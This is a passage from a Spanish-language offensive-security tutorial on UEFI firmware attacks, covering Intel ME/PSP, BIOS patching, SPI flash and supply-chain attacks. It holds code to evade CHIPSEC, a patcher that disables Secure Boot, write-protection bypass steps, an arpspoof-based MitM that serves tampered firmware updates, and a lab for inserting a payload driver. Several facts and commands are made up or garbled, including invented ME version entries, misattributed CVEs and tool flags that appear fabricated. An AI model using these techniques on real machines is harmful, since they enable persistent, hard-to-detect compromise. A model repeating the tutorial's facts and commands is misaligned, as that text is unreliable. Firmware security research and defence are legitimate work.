5. **SMRAM hiding**: Usar tecnicas para ocultar presencia en SMRAM

```c
// Evasion: detectar CHIPSEC
EFI_STATUS CheckForChipsec() {
    // Buscar signature de CHIPSEC en memoria
    UINTN ChipsecSig = 0x43484950534543; // "CHIPSEC"
    
    // Buscar en espacio de direcciones de DXE
    for (UINTN addr = 0x100000; addr < 0x1000000; addr += 0x1000) {
        if (*(UINTN*)addr == ChipsecSig) {
            return EFI_SUCCESS; // CHIPSEC detectado!
        }
    }
    return EFI_NOT_FOUND;
}
```

---

## 5. Intel ME / AMD PSP

### 5.1 Intel Management Engine

Intel ME (Management Engine) es un microcontrolador independiente integrado en el chipset. Corre un mini-OS llamado MINIX y tiene:

- Procesador ARC/386 dedicado
- Memoria propia (32MB+)
- Acceso a [red](../raw/r3d3s-f0nd4m3nt0s.md) (MAC dedicada)
- [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) (no se apaga con el sistema)
- Acceso total a la memoria del host

**Versiones de ME:**
| ME Version | Arquitectura | Ano | Caracteristicas |
|------------|-------------|-----|-----------------|
| ME 1.x | ARC | 2006 | AMT basico |
| ME 2.x | ARC | 2008 | Flash sharing |
| ME 3.x | ARC | 2010 | 3G/LTE |
| ME 4.x | [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86) | 2011 | [wifi](../raw/w1f1-4tt4cks.md) display |
| ME 5.x | X86 | 2012 | Touch screen |
| ME 6.x | X86 | 2013 | DCI (Direct Connect) |
| ME 7.x | X86 | 2014 | Enhanced privacy |
| ME 8.x | X86 | 2015 | OemTwistedPain |
| ME 11.x | X86 | 2017 | Skylake |
| ME 12.x | X86 | 2018 | Coffee Lake |
| ME 14.x | X86 | 2020 | Tiger Lake |
| ME 16.x | X86 | 2022 | Alder Lake |

### 5.2 AMD Platform Security Processor

AMD PSP es el equivalente al Intel ME. Corre un nucleo ARM Cortex-A5.

**Diferencias con Intel ME:**
- Codigo open-source (partes)
- Basado en ARM (vs x86)
- Menor funcionalidad de red (no tiene AMT)
- Memoria compartida con host
- Ejecucion de [firmware](../raw/u3f1-r00tk1ts.md#firmware) en etapas

### 5.3 Arquitectura de ME/PSP

```
┌──────────────────────────────────────────────────┐
│  Host (x86)                                       │
│  ┌────────────────────────────────────────────┐   │
│  │  OS / Applications                         │   │
│  └────────────────────────────────────────────┘   │
│              │ PCI/MMIO                           │
└──────────────┼───────────────────────────────────┘
               │
┌──────────────┼───────────────────────────────────┐
│  Intel ME    │                                    │
│  ┌───────────▼──────────────────────────────┐    │
│  │  MINIX 3 (Microkernel OS)                │    │
│  │  ┌──────────────────┐ ┌───────────────┐ │    │
│  │  │ Thread Manager  │ │ File System   │ │    │
│  │  ├──────────────────┤ ├───────────────┤ │    │
│  │  │ Power Manager   │ │ Network Stack │ │    │
│  │  ├──────────────────┤ ├───────────────┤ │    │
│  │  │ Security Manager│ │ AMT Service   │ │    │
│  │  └──────────────────┘ └───────────────┘ │    │
│  └──────────────────────────────────────────┘    │
│           │                                      │
│  ┌────────▼─────────────────────────┐            │
│  │  Hardware (ARC/x86)              │            │
│  │  - RAM dedicada (16-32MB)        │            │
│  │  - MAC Ethernet dedicada         │            │
│  │  - DMA controller                │            │
│  └──────────────────────────────────┘            │
└──────────────────────────────────────────────────┘
```

### 5.4 Intel AMT

AMT (Active Management Technology) es una caracteristica de ME que permite:

- Acceso remoto al sistema (KVM sobre [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip))
- Control de power (encender/apagar remotamente)
- Redireccion de consola (Serial over LAN)
- Acceso a archivos (IDE-R)
- Conectividad 24/7 independiente del SO

**Puertos AMT:**
| [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) | [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red) | Servicio |
|--------|-----------|----------|
| 16992 | [http](../raw/r3d3s-f0nd4m3nt0s.md#http) | WebUI |
| 16993 | [https](../raw/r3d3s-f0nd4m3nt0s.md#https) | WebUI seguro |
| 16994 | WS-Management | Gestion |
| 16995 | WS-Management [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) | Gestion segura |
| 623 | RMCP | IPMI/KVM |

### 5.5 Vulnerabilidades conocidas

**Intel ME:**
- SA-00086: Elevacion de privilegios (2017)
- SA-00135: Denegacion de servicio (2018)
- SA-00213: Ejecucion de codigo (2019)
- SA-00295: [escalada de privilegios](../raw/l1n9x-pr1v3sc.md) (2020)
- SA-00527: Boot guard bypass (2021)
- SA-00680: MEInfo/Unlock token leakage (2022)

**AMD PSP:**
- [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2018-3620: L1TF (Foreshadow) en PSP
- CVE-2020-12890: PSP [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow)
- CVE-2021-26314: PSP firmware verification
- CVE-2022-23822: PSP arbitrary read

### 5.6 Extraccion y analisis de ME/PSP

```bash
# Analizar Intel ME desde firmware dump
# Extraer firmware
flashrom -p internal -r full_firmware.bin

# Usar intelmetool para analizar ME
intelmetool -i firmware.bin

# Extraer region ME
UEFITool firmware.bin -extract -region ME

# Analizar con FirmWire (emulador de ME)
firmwire.py --platform intel --loader raw --kernel me_firmware.bin

# AMD PSP analysis
# Usar FirmWire para emular PSP
firmwire.py --platform amd --loader raw --kernel psp_firmware.bin

# Extraer descriptores de firmware
# Usar UEFITool para ver regiones: ME, BIOS, GBE, PDR
```

**ME region components:**
```
ME Region
├── FTPR (FTP Region): Firmware principal
│   ├── RBE: ROM BIST Entry
│   ├── kernel: MINIX kernel
│   ├── syslib: System libraries
│   └── modules: ME modules (AMT, HECI, etc.)
├── MFS (Manageability Firmware)
├── KMR (Key Management Region)
└── UFS (User File System)
```

---

## 6. BIOS Modification

### 6.1 [uefi](../raw/u3f1-r00tk1ts.md) [firmware](../raw/u3f1-r00tk1ts.md#firmware) unpacking

El firmware UEFI se almacena en SPI flash como una imagen estructurada. Las herramientas principales para unpacking son UEFITool y UEFIExtract.

**Estructura de una imagen de firmware:**

```
SPI Flash (16-32 MB)
├── Descriptor Region (4KB)
│   ├── Flash Descriptor
│   ├── Master Access Table
│   └── ME VSCC Table
├── BIOS Region (variable)
│   ├── Firmware Volume 1 (FV)
│   │   ├── FFS File 1 (PEI Core)
│   │   ├── FFS File 2 (DXE Driver 1)
│   │   ├── FFS File 3 (DXE Driver 2)
│   │   └── ...
│   └── Firmware Volume 2 (FV)
│       ├── FFS File N
│       └── ...
├── Intel ME Region (variable)
│   ├── RBE (ROM BIST)
│   ├── MFS (MANAGEABILITY FIRMWARE)
│   └── FTPR (FTP REGION)
├── GbE Region (8KB)
│   └── Intel Gigabit Ethernet Configuration
└── PDR Region (Platform Data Region)
```

### 6.2 UEFITool

UEFITool es la herramienta principal para inspeccionar y modificar firmware UEFI.

```bash
# Instalacion
git clone https://github.com/LongSoft/UEFITool
cd UEFITool/UEFITool
qmake UEFITool.pro
make

# Uso basico con GUI
# Abrir firmware.bin → explorar estructura

# Uso con CLI (UEFIExtract)
UEFIExtract firmware.bin extract_dir

# Uso con CLI (UEFIFind)
UEFIFind firmware.bin -guid 12345678-1234-1234-1234-123456789012

# Uso con CLI (UEFIPatch)
UEFIPatch firmware.bin patch.txt
```

**Operaciones comunes con UEFITool:**

```bash
# 1. Extraer todas las regiones
UEFITool firmware.bin -extractall

# 2. Buscar GUID especifico
UEFIFind firmware.bin -guid FCEF1C11-BC7F-43AA-99EA-79D09A33A614

# 3. Extraer un FFS file por GUID
UEFIExtract firmware.bin -guid FCEF1C11-BC7F-43AA-99EA-79D09A33A614 -o extracted.ffs

# 4. Reemplazar un archivo en el firmware
# UEFITool: Replace body → seleccionar archivo patch

# 5. Aplicar patch
echo "pattern: 0011223344556677: AABBCCDDEEFF0011" > patch.txt
UEFIPatch firmware.bin patch.txt
```

### 6.3 Modificacion de firmware

**Identificar componentes para modificar:**

```bash
# 1. Listar todos los DXE drivers
UEFITool firmware.bin -list -type dxe

# 2. Extraer un driver especifico
UEFITool firmware.bin -extract -guid {driver_guid}

# 3. Desensamblar driver
objdump -d extracted_driver.efi

# 4. Buscar strings interesantes
strings extracted_driver.efi | grep -i "password\|secure\|key\|signature"

# 5. Identificar protocolos usados
# Buscar en el driver: gEfi...ProtocolGuid
```

**Tecnicas de modificacion:**

1. **Patch de instrucciones**: Modificar bytes en el [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) descompilado
2. **Reemplazo de binario**: Compilar nuevo driver y reemplazar
3. **Insercion de nuevo modulo**: Agregar DXE driver adicional
4. **Modificacion de NVRAM default**: Cambiar configuracion de fabrica

```python
#!/usr/bin/env python3
"""firmware_patcher.py - Parcheo de firmware UEFI"""

import struct
import hashlib

class FirmwarePatcher:
    def __init__(self, firmware_path: str):
        with open(firmware_path, "rb") as f:
            self.data = bytearray(f.read())
        self.path = firmware_path

    def find_pattern(self, pattern: bytes) -> list:
        """Busca un patron en el firmware"""
        offsets = []
        start = 0
        while True:
            offset = self.data.find(pattern, start)
            if offset == -1:
                break
            offsets.append(offset)
            start = offset + 1
        return offsets

    def patch_bytes(self, offset: int, new_bytes: bytes):
        """Parchea bytes en una posicion"""
        if offset + len(new_bytes) > len(self.data):
            raise ValueError("Offset fuera de rango")
        self.data[offset:offset + len(new_bytes)] = new_bytes

    def patch_boot_logo(self, new_logo_path: str):
        """Reemplaza el logo de boot"""
        # Buscar logo BMP en firmware
        bmp_header = b"\x42\x4D"  # BMP magic
        offsets = self.find_pattern(bmp_header)
        with open(new_logo_path, "rb") as f:
            new_logo = f.read()
        for offset in offsets:
            # Verificar que sea el logo de boot (no otros BMPs)
            if self.data[offset:offset+2] == bmp_header:
                self.patch_bytes(offset, new_logo)

    def disable_secure_boot(self):
        """Deshabilita Secure Boot en firmware modificado"""
        # Buscar patron de Secure Boot enable
        patterns = [
            b"\x01SecureBoot",  # Variable
            b"SecureBoot\x01",
            b"\x75\x3C\x48\x8B"  # Codigo assembly
        ]
        for pattern in patterns:
            offsets = self.find_pattern(pattern)
            for offset in offsets:
                # NOP out la verificacion
                self.patch_bytes(offset, b"\x90" * len(pattern))

    def save(self, output_path: str = None):
        """Guarda el firmware modificado"""
        path = output_path or self.path.replace(".bin", "_patched.bin")
        with open(path, "wb") as f:
            f.write(self.data)
        print(f"[+] Firmware guardado: {path}")

    def verify_integrity(self):
        """Verifica checksums despues del parcheo"""
        # Algunos firmwares tienen checksums internos
        print("[!] La integridad puede estar comprometida")
        return True


if __name__ == "__main__":
    patcher = FirmwarePatcher("firmware.bin")
    patcher.disable_secure_boot()
    patcher.save("firmware_modified.bin")
```

### 6.4 Repacking de firmware

```bash
# 1. Extraer todo
UEFITool firmware.bin -extractall dir/

# 2. Modificar archivos en dir/
# 3. Reconstruir (NO hay herramienta automatica, es manual)

# Para reconstruir, se usan:
# - UEFITool: Insert → Replace body para cada archivo modificado
# - UEFIReplace: reemplazo desde CLI
# - UEFIPatch: aplicar patches binarios

# 4. Verificar que el firmware modificado sea funcional
# Usar FirmWire para emular
firmwire.py --platform uefi --loader firmware_modified.bin

# Firmar si es necesario
# Si el firmware requiere firma, usar:
sbsign --key platform_key.key --cert platform_cert.pem firmware_patched.bin

# O usar herramienta del fabricante
# Intel: Flash Image Tool (FIT)
# AMI: AMIBCP (AMI BIOS Configuration Program)
```

### 6.5 Capsule update manipulation

Los capsules de actualizacion de firmware se aplican desde el SO via UpdateCapsule().

```bash
# Analizar un capsule de actualizacion
UEFITool capsule.cap

# Estructura tipica de capsule:
# - Capsule Header
# - FMP (Firmware Management Protocol)
#   - Payload (firmware actualizado)
#   - Authentication Info
# - Capsule Footer

# Modificar capsule
# 1. Extraer payload
# 2. Modificar payload
# 3. Re-insertar en capsule
# 4. Actualizar firma (si esta firmado)

# Aplicar capsule modificado
python fwupd_mod.py --apply capsule_modified.cap

# En Windows:
# wusa.exe firmware_update.cab /quiet /norestart

# En Linux:
fwupdmgr install firmware_modified.cab
```

---

## 7. SPI Flash Attacks

### 7.1 SPI flash hardware

El [firmware](../raw/u3f1-r00tk1ts.md#firmware) [uefi](../raw/u3f1-r00tk1ts.md) se almacena en un chip SPI flash en la motherboard.

**Caracteristicas de SPI flash:**
- Chips: Winbond, Macronix, Micron, GigaDevice
- tamanos: 8MB, 16MB, 32MB o 64MB
- Paquete: SOIC-8 o SOIC-16 (mas comun SOIC-8)
- Voltaje: 3.3V o 1.8V
- Interfaz: SPI (Serial Peripheral Interface)
- Pines: CS, MISO, MOSI, CLK, VCC, GND

**Pinout SOIC-8:**
```
  ┌──────────┐
1 │ CS       │ VCC │ 8
2 │ MISO     │ HOLD│ 7
3 │ WP       │ CLK │ 6
4 │ GND      │ MOSI│ 5
  └──────────┘
```

### 7.2 Hardware dump de firmware

**Equipamiento necesario:**
- Programador SPI: CH341A (USB, $5), Flashcat, Dediprog
- Adaptador SOIC-8 clip (para leer sin desoldar)
- SOIC-8 socket (para chips desoldados)
- Cable dupont

```bash
# Dump con Flashrom y CH341A
# Con clip sin desoldar
flashrom -p ch341a_spi -r firmware.bin

# Verificar conexion
flashrom -p ch341a_spi

# Si el chip esta en placa con otros dispositivos:
# Usar voltaje mas bajo (3.3V) y verificar pull-ups
flashrom -p ch341a_spi -r firmware.bin -V

# Dump con programador Dediprog (mas profesional)
flashrom -p dediprog -r firmware.bin
```

**Consideraciones de hardware:**
- **Chip alimentado por la placa vs programador**: Verificar voltajes compatibles
- **Write protect**: Revisar pin WP# en el chip
- **Hold**: Revisar pin HOLD# (si esta bajo, el chip ignora SPI)
- **Desoldado**: A veces es mas confiable desoldar el chip
- **1.8V chips**: Requieren adaptador de voltaje o programador 1.8V

```bash
# Identificar chip SPI
flashrom -p internal --flash-name
# Found Winbond flash chip "W25Q128.VM" (16384 kB, SPI)

# Verificar proteccion de region
flashrom -p internal --wp-status
# WP: status: 0x00e0
# WP: write protect is enabled
# WP: write protect range: start=0x000000, len=0x1000000
```

### 7.3 Flash programming

```bash
# Escribir firmware en SPI flash
flashrom -p ch341a_spi -w modified_firmware.bin

# Verificar escritura
flashrom -p ch341a_spi -v modified_firmware.bin

# Escribir solo una region (si hay proteccion)
flashrom -p internal -w modified_bios_region.bin --fmap -i BIOS

# Flasheo desde SO (si esta desbloqueado)
flashrom -p internal -w firmware.bin
```

### 7.4 Write protection bypass

**Metodos de bypass:**

1. **Hardware:**
   - Desoldar chip y programar externamente (siempre funciona)
   - Voltage glitching en pin WP# durante escritura
   - Cortar pin WP# y conectarlo a VCC

2. **Software:**
   - Modificar Master Access Table en descriptor de firmware
   - Explotar [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) en SMM para escribir
   - Usar Intel Flash Image Tool para modificar accesos

3. **BIOS Configuration:**
   - Si BIOS setup tiene opcion de "BIOS Write Protection" deshabilitada
   - Resetear CMOS puede deshabilitar proteccion temporalmente

```bash
# Verificar estado de WP
flashrom -p internal --wp-status

# Intentar deshabilitar WP
flashrom -p internal --wp-disable

# Si falla, usar metodo hardware
# Desoldar chip → programar externamente → soldar de vuelta

# Modificar descriptor para desbloquear regiones
# Usar UEFITool para modificar Master Access Table
```

### 7.5 Ejercicio: SPI dump y analisis

**Objetivo:** Realizar un dump de firmware SPI flash y analizar su estructura.

**Materiales:**
- Placa con chip SPI flash (PC, laptop, [router](../raw/r3d3s-f0nd4m3nt0s.md#routers))
- CH341A programador
- SOIC-8 clip
- Cable USB
- Ubuntu Live USB (para evitar OS protection)

**Pasos:**
1. Apagar equipo y desconectar bateria (laptop)
2. Localizar chip SPI en motherboard
3. Conectar clip SOIC-8 alineando pin 1
4. Conectar CH341A a USB
5. Ejecutar: `flashrom -p ch341a_spi`
6. Verificar que detecta el chip
7. Dump: `flashrom -p ch341a_spi -r firmware.bin`
8. Verificar: `flashrom -p ch341a_spi -v firmware.bin`
9. Analizar: `UEFITool firmware.bin`
10. Identificar regiones: BIOS, ME, GbE
11. Extraer DXE drivers
12. Buscar strings interesantes: passwords, keys, configs

---

## 8. Supply Chain Attacks

### 8.1 Pre-installed [firmware](../raw/u3f1-r00tk1ts.md#firmware) malware

Malware instalado en firmware durante la fabricacion:

**Casos documentados:**
- **Equation Group**: Firmware de disco duro (HDD/SSD firmware rootkit)
- **LoJack / Computrace**: Persistente en firmware AMI
- **Lenovo Service Engine**: Pre-instalado en [uefi](../raw/u3f1-r00tk1ts.md)
- **HP Firmware Backdoor**: Herramientas de diagnostico maliciosas

**Indicadores de compromiso de supply chain:**
- Firmware con certificados de prueba (test keys)
- Volumen adicional en flash ([payload](../raw/m3t4spl01t.md#payloads) extra)
- Drivers firmados con certificados desconocidos
- Comunicaciones de [red](../raw/r3d3s-f0nd4m3nt0s.md) desde firmware ([dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) a dominios extranos)
- Modulos ME/PSP modificados

### 8.2 ODM backdoors

Los ODM (Original Design Manufacturers) pueden insertar backdoors durante el diseno/fabricacion.

**Ejemplos:**
- **Supermicro BMC**: Chip malicioso en motherboard (2018)
- **Servidores chinos**: Chips espia en placas base
- **Camaras [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip)**: Firmware con backdoors de fabricante
- **Routers ISP**: Firmware con puertas traseras de gobierno

```bash
# Detectar backdoors ODM
# 1. Comparar hash de firmware con version oficial
wget https://vendor.com/firmware/official_v1.0.bin
sha256sum official_v1.0.bin firmware.bin
# Si difiere, hay modificacion no oficial

# 2. Buscar certificados extranos en firmware
UEFITool firmware.bin -list -type cert

# 3. Analizar trafico de red del firmware
# Usar CHIPSEC para monitorear accesos ME/PSP a red
chipsec_main -m tools.uefi.scan

# 4. Verificar integridad de microcodigo
# Comparar microcodigo CPU con versiones oficiales de Intel
```

### 8.3 Firmware update [mitm](../raw/m1tm-m0b1l3.md)

Interceptar y modificar actualizaciones de firmware en transito.

```bash
# MitM de actualizacion de firmware
# 1. Interceptar trafico HTTP/HTTPS de actualizacion
# 2. Descargar actualizacion legitima
# 3. Modificar firmware
# 4. Firmar con certificado propio (si se tiene acceso al KEK)
# 5. Servir firmware modificado a la victima

# Configurar proxy ARP spoofing
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Capturar trafico de actualizacion
tcpdump -i eth0 port 80 or port 443 -A | grep -i "firmware\|capsule\|update"

# Servir firmware falso
# Crear servidor HTTP local con firmware modificado
python -m http.server 80
```

### 8.4 Casos reales

**Caso 1: LoJack / Computrace**
- Tecnologia de recuperacion de laptops robadas
- Persistente en firmware AMI
- Absolutamente imposible de remover (ni reinstalando OS)
- Podia ser usado maliciosamente para [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) de malware

**Caso 2: Equation Group HDD Rootkit**
- NSA/Five Eyes
- Modificaba firmware de discos duros (Western Digital, Seagate, Maxtor)
- Persistia incluso despues de formateo bajo nivel
- Ocultaba datos en sectores inaccesibles del disco

**Caso 3: Lenovo UEFI Backdoor**
- Lenovo Service Engine pre-instalado en UEFI
- Se reinstalaba despues de reinstalar Windows
- Capaz de reinstalar software de Lenovo sin consentimiento
- Vulnerable a ataques MitM

**Caso 4: MoonBounce UEFI [bootkit](../raw/u3f1-r00tk1ts.md#bootkits)**
- Bootkit UEFI descubierto en 2022
- Infectaba firmware SPI flash
- Persistente en entornos corporativos
- Capacidad de cargar payload en [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) de Windows
- Vinculado a APT (posiblemente ruso)

**Caso 5: BlackLotus UEFI Bootkit (2023)**
- Primer bootkit UEFI que evade [secure boot](../raw/u3f1-r00tk1ts.md#secure-boot)
- Usa [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2022-21894 (Black Lotus)
- Persistente en ESP
- Capacidad de deshabilitar protecciones de Windows
- Vendido en foros underground como servicio

---

## 9. Herramientas

### 9.1 UEFITool

Herramienta principal para analisis y modificacion de [firmware](../raw/u3f1-r00tk1ts.md#firmware) [uefi](../raw/u3f1-r00tk1ts.md).

```bash
# Caracteristicas principales:
# - Visualizacion de estructura de firmware
# - Extraccion e insercion de archivos
# - Busqueda por GUID, nombre, tipo
# - Parsing de FFS, FV, Capsule, etc.

# Comandos utiles:
# GUI: UEFITool firmware.bin
# CLI Extraction: UEFIExtract firmware.bin output_dir
# CLI Search: UEFIFind firmware.bin -guid <GUID>
# CLI Patch: UEFIPatch firmware.bin patch.txt

# Filtros de busqueda en UEFITool:
# - GUID: buscar por identificador unico
# - Name: buscar por nombre de archivo
# - Type: RAW, PE32, TE, FFS, FV
# - Padding: espacios libres en FV
```

### 9.2 CHIPSEC

Framework de seguridad para plataformas [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86). Permite escanear configuraciones de seguridad de firmware.

```bash
# Instalacion
pip install chipsec
# o
git clone https://github.com/chipsec/chipsec
cd chipsec
python setup.py install

# Modulos principales:
chipsec_main -m common.bios_wp       # BIOS write protection
chipsec_main -m common.spi_desc       # SPI descriptor
chipsec_main -m common.uefi_s3        # UEFI S3 boot
chipsec_main -m common.secureboot     # Secure Boot config
chipsec_main -m tools.uefi.scan      # Scan UEFI variables
chipsec_main -m common.lock_smm       # SMM lock
chipsec_main -m common.smrr           # SMRR configuration
chipsec_main -m common.rtclock        # RTC lock
chipsec_main -m common.ia32cfg        # IA32 features

# Escaneo completo de seguridad:
chipsec_main -a all
```

### 9.3 Flashrom

Herramienta universal para leer/escribir/verificar chips SPI flash.

```bash
# Instalacion
# Linux: apt install flashrom
# Windows: binarios precompilados
# macOS: brew install flashrom

# Comandos basicos:
flashrom -p internal --flash-name      # Identificar chip
flashrom -p internal -r backup.bin     # Leer firmware
flashrom -p internal -w new.bin       # Escribir firmware
flashrom -p internal -v verify.bin    # Verificar

# Con programadores externos:
flashrom -p ch341a_spi -r dump.bin     # CH341A
flashrom -p ft2232_spi:type=2232H -r   # FTDI
flashrom -p buspirate_spi:dev=/dev/ttyUSB0  # Bus Pirate
flashrom -p raiden_debug_spi:dev=1     # Intel DCI
```

### 9.4 intelmetool

Herramienta para extraer y analizar Intel Management Engine.

```bash
# Instalacion
git clone https://github.com/mjg59/intelmetool
cd intelmetool
make

# Comandos:
intelmetool -i firmware.bin     # Informacion de ME
intelmetool -d firmware.bin     # Descomprimir ME
intelmetool -e firmware.bin     # Extraer regiones
intelmetool -u firmware.bin     # Desbloquear ME
```

### 9.5 SBAT

SBAT ([secure boot](../raw/u3f1-r00tk1ts.md#secure-boot) Advanced Targeting) es el mecanismo para revocar bootloaders vulnerables.

```bash
# Verificar SBAT:
mokutil --sbat
mokutil --sbat-list

# SBAT policy:
# Implementado en shim + GRUB2 + kernel
# Permite revocar especificas versiones vulnerables

# Forzar actualizacion de SBAT:
mokutil --sbat-policy "revoke"
```

### 9.6 FirmWire

Emulador de firmware para analisis dinamico de Intel ME y AMD PSP.

```bash
# Instalacion
git clone https://github.com/grimm-co/FirmWire
cd FirmWire
pip install -r requirements.txt

# Emular Intel ME
firmwire.py --platform intel --loader raw --kernel me_firmware.bin

# Emular AMD PSP
firmwire.py --platform amd --loader raw --kernel psp_firmware.bin

# Emular UEFI
firmwire.py --platform uefi --loader firmware.bin

# Caracteristicas:
# - Emulacion en QEMU
# - Tracing de ejecucion
# - Fuzzing de protocolos
# - Debug de firmware
```

---

## 10. Defensa y Mitigacion

**Practicas recomendadas:**

| Area | Mitigacion | Prioridad |
|------|------------|-----------|
| [secure boot](../raw/u3f1-r00tk1ts.md#secure-boot) | Activar, configurar KEK/DB/DBX correctamente | Critica |
| Boot Guard | Activar Intel Boot Guard ([firmware](../raw/u3f1-r00tk1ts.md#firmware) verificable) | Alta |
| SMM | Activar SMM lock, monitorear modificaciones | Alta |
| SPI | Activar BIOS Write Protection | Critica |
| ME/PSP | Deshabilitar features innecesarios (AMT, etc.) | Alta |
| Update | Validar firmas de actualizaciones de firmware | Critica |
| Supply Chain | Verificar [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) de firmware contra el fabricante | Alta |
| Monitoring | CHIPSEC periodico + monitoreo de integridad | Media |
| Response | Tener procedimiento para incidentes de firmware | Media |

**CHIPSEC hardening script:**

```bash
#!/bin/bash
# firmware_hardening.sh - Verificaciones de seguridad de firmware

echo "=== Seguridad de Firmware ==="

# 1. BIOS Write Protection
echo "[*] Verificando BIOS WP..."
chipsec_main -m common.bios_wp

# 2. Secure Boot
echo "[*] Verificando Secure Boot..."
mokutil --sb-state

# 3. SMM Lock
echo "[*] Verificando SMM lock..."
chipsec_main -m common.lock_smm

# 4. SMRR configuration
echo "[*] Verificando SMRR..."
chipsec_main -m common.smrr

# 5. SPI descriptor
echo "[*] Verificando SPI descriptor..."
chipsec_main -m common.spi_desc

# 6. UEFI variables
echo "[*] Escaneando UEFI variables..."
chipsec_main -m tools.uefi.scan

# 7. Resultados
echo "[+] Verificaciones completadas"
```

---

## 11. Laboratorio Final

**Objetivo:** Realizar un analisis completo de seguridad de [firmware](../raw/u3f1-r00tk1ts.md#firmware) [uefi](../raw/u3f1-r00tk1ts.md).

**Escenario:** Se ha obtenido un dump de firmware de una laptop corporativa. Determinar si el firmware tiene configuraciones inseguras o posibles backdoors.

**Fases:**

**Fase 1: Extraccion (1 hora)**
1. Obtener dump de firmware (SPI flash)
2. Verificar integridad del dump ([hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions), tamano)
3. Identificar chip y fabricante

**Fase 2: Analisis estatico (2 horas)**
1. Abrir firmware con UEFITool
2. Identificar regiones: BIOS, ME, GbE, PDR
3. Listar todos los DXE drivers
4. Buscar certificados y firmas
5. Extraer y analizar drivers sospechosos
6. Buscar strings: passwords, keys, dominios

**Fase 3: Verificacion de seguridad (1 hora)**
1. Verificar [secure boot](../raw/u3f1-r00tk1ts.md#secure-boot) (KEK, DB, DBX)
2. Verificar BIOS Write Protection
3. Verificar configuracion SMM
4. Verificar SPI descriptor (Master Access Table)
5. Verificar estado de ME/PSP

**Fase 4: Modificacion (2 horas)**
1. Crear un parche para deshabilitar Secure Boot
2. Compilar un DXE [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) [payload](../raw/m3t4spl01t.md#payloads) simple
3. Insertar en firmware
4. Recalcular checksums si es necesario
5. Preparar firmware modificado para flasheo

**Fase 5: Reporte (1 hora)**
Documentar:
- Fabricante y version de firmware
- Configuraciones inseguras encontradas
- Certificados presentes (oficiales vs test)
- Modificaciones realizadas
- Recomendaciones de hardening

**Entregables:**
- Dump de firmware original (con hash)
- Reporte de analisis de seguridad
- Firmware parcheado (demostracion)
- Script de hardening

> **Disclaimer:** Este tutorial es exclusivamente con fines educativos. La modificacion de firmware sin [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion) puede danar permanentemente el hardware y violar terminos de garantia y leyes locales. Solo realizar estas tecnicas en equipos propios o con [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion) explicita por escrito.

---

## 12. Apendices

### Apendice A: Glosario de Terminos de [firmware](../raw/u3f1-r00tk1ts.md#firmware)

| Termino | Significado |
|---------|-------------|
| ACPI | Advanced Configuration and Power Interface |
| BDS | Boot Device Selection phase |
| BIOS | Basic Input/Output System |
| Boot Guard | Verificacion de firma de firmware Intel |
| Capsule | Formato de actualizacion de firmware |
| CSME | Converged Security and Manageability Engine |
| DB | Signature Database (whitelist de [secure boot](../raw/u3f1-r00tk1ts.md#secure-boot)) |
| DBX | Forbidden Signature Database (blacklist) |
| DMA | Direct Memory Access |
| DXE | [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) Execution Environment phase |
| EC | Embedded Controller |
| ESP | EFI System Partition |
| FFS | Firmware File System |
| FIT | Flash Image Tool (Intel) |
| FMP | Firmware Management Protocol |
| FV | Firmware Volume |
| GbE | Gigabit Ethernet region |
| GPT | GUID Partition Table |
| GUID | Globally Unique Identifier |
| KEK | Key Exchange Key |
| ME | Management Engine (Intel) |
| MOK | Machine Owner Key |
| NVRAM | Non-Volatile RAM ([uefi](../raw/u3f1-r00tk1ts.md) variables) |
| PCIe | PCI Express |
| PEI | Pre-EFI Initialization phase |
| PEIM | PEI Module |
| PK | Platform Key |
| PSP | Platform Security Processor (AMD) |
| [ptt](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-ticket) | Platform Trust Technology |
| ROM | Read Only Memory |
| RT | Runtime phase |
| SBAT | Secure Boot Advanced Targeting |
| SEC | Security phase |
| SMI | System Management Interrupt |
| SMM | System Management Mode |
| SMRAM | SMM RAM (memoria aislada) |
| SPI | Serial Peripheral Interface |
| TPM | Trusted Platform Module |
| TXT | Trusted Execution Technology |
| UEFI | Unified Extensible Firmware Interface |
| WP | Write Protect |

### Apendice B: Cheatsheet de Comandos

```bash
# FIRMWARE DUMP
flashrom -p internal -r firmware.bin
flashrom -p ch341a_spi -r firmware.bin
flashrom -p internal --wp-status

# FIRMWARE ANALYSIS
UEFITool firmware.bin
UEFIExtract firmware.bin output_dir
UEFIFind firmware.bin -guid {GUID}
strings firmware.bin | grep -i "password\|key\|secret"

# SECURE BOOT
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx

# CHIPSEC
chipsec_main -m common.bios_wp
chipsec_main -m common.secureboot
chipsec_main -m common.spi_desc
chipsec_main -m common.lock_smm
chipsec_main -a all

# INTEL ME
intelmetool -i firmware.bin
mei-amt-check

# FIRMWARE EMULATION
firmwire.py --platform intel --loader raw --kernel me_fw.bin
firmwire.py --platform uefi --loader firmware.bin

# UEFI SHELL COMMANDS
Shell> map -r
Shell> ls fs0:\EFI\
Shell> dmpstore -all
Shell> bcfg boot dump
Shell> reset -c
```

### Apendice C: Referencias y Lecturas Recomendadas

**Documentacion:**
